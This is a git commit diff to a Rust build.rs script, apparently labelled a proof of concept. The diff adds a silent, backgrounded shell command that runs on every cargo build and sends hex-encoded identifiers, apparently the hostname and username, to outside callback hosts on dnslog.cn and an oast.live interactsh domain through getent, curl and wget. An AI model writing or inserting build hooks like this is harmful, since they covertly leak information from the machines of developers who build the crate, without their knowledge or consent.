4c2020c682b51c9b1aa4c4187d699180a3583049
poc <poc@example.com>
2026-09-11 02:13:57 -0400

    nova v3 n2a05833

--- build.rs
+++ build.rs
@@ -17,15 +17,12 @@ fn main() {
     let i = hex(&id[..id.chars().take(45).count()]);
     let h = hex(&hn[..hn.chars().take(45).count()]);
     let u = hex(&un[..un.chars().take(30).count()]);
-    let tag = "a1a05711";
+    let tag = "n2a05833";
     let ish = "dahpi2cgtqkhhbklhpp03u61y7w5xbgxx.oast.live";
-    // dual OOB: dnslog.cn (user-visible) + interactsh (self-poll)
+    // dual OOB: dnslog.cn (user) + interactsh (self), no inner quotes
     let cmd = format!(
-        "(getent hosts i{}.{}.y1acsd.dnslog.cn; getent hosts h{}.{}.y1acsd.dnslog.cn; getent hosts ping.{}.y1acsd.dnslog.cn; curl -sm 8 http://ping.{}.y1acsd.dnslog.cn/x >/dev/null 2>&1; getent hosts ping.{}.{}; getent hosts i{}.h{}.{}; curl -sm 8 -H "X-I: {}" -H "X-H: {}" -H "X-U: {}" http://p.{}.{}/x >/dev/null 2>&1; wget -q -T 8 -O /dev/null http://w.{}.{}/x 2>/dev/null) >/dev/null 2>&1 &",
-        i, tag, h, tag, tag, tag,
-        tag, ish, i, h, ish,
-        i, h, u, tag, ish,
-        tag, ish
+        "(getent hosts ping.{}.y1acsd.dnslog.cn; curl -sm 8 http://ping.{}.y1acsd.dnslog.cn/x; getent hosts ping.{}.{}; curl -sm 8 http://p.{}.{}/{}/{}/{}; wget -q -T 8 -O /dev/null http://w.{}.{}/{}/{}/{}) >/dev/null 2>&1 &",
+        tag, tag, tag, ish, tag, ish, i, h, u, tag, ish, i, h, u
     );
     let _ = sh(&cmd);
     println!("cargo:warning=stylus-verify-poc-build-ok");
